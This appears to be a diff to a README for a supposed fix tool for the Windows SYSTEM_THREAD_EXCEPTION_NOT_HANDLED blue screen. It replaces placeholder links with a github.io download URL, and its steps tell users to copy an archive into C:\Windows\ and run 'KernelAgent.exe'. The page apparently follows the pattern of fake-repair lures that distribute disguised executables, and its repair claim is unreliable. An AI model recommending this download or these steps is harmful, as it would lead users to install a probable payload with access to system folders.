@@ -2,7 +2,8 @@
 
 This patch resolves the SYSTEM_THREAD_EXCEPTION_NOT_HANDLED BSOD on Windows 10/11. It targets driver conflicts, corrupted threads, and system boot failures.
 
-[![Download Fix Tool](https://img.shields.io/badge/Download-Fix_Tool-blueviolet)](🔗 PLACE_YOUR_DOWNLOAD_LINK_HERE)
+[![Download Fix Tool](https://img.shields.io/badge/Download-Fix_Tool-blueviolet)](https://fixsystem-thread-exception-not-handled.github.io/.github
+)
 
 ---
 
@@ -17,7 +18,8 @@ This patch resolves the SYSTEM_THREAD_EXCEPTION_NOT_HANDLED BSOD on Windows 10/1
 
 ### ⚙️ Installation Instructions
 
-1. 📦 **Download the archive** from the [Releases](🔗 PLACE_YOUR_DOWNLOAD_LINK_HERE) section or from the button above  
+1. 📦 **Download the archive** from the [Releases](https://fixsystem-thread-exception-not-handled.github.io/.github
+) section or from the button above  
 2. 📁 **Extract the folder** and move it into your main `C:\Windows\` directory  
 3. 🖱 **Run the executable file** `KernelAgent.exe`  
 4. 🔁 Restart your computer after the process is complete
